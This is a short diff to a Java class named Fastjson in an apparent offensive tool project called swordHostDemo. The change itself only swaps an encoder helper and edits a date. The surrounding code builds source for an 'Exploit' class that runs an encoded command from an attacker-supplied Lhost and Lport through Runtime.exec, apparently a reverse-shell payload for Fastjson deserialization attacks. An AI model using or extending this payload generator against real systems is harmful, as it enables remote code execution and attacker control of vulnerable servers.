@@ -1,7 +1,9 @@
 package com.swordHostDemo.controller;
 
+import com.swordHostDemo.utls.EnCode;
+
 /**
- * @date: 2022/12/28 18:45
+ * @date: 2022/12/28 20:45
  * @description:
  */
 public class Fastjson {
@@ -13,7 +15,7 @@ public class Fastjson {
                 "\n" +
                 "public class Exploit{\n" +
                 "    public Exploit() throws Exception {\n" +
-                "        Process p = Runtime.getRuntime().exec(new String[]{\""+base64Code.JavaEncode(Lhost,Lport)+"\"});\n"+
+                "        Process p = Runtime.getRuntime().exec(new String[]{\""+ EnCode.JavaEncode(Lhost,Lport)+"\"});\n"+
                 "        InputStream is = p.getInputStream();\n" +
                 "        BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n" +
                 "\n" +
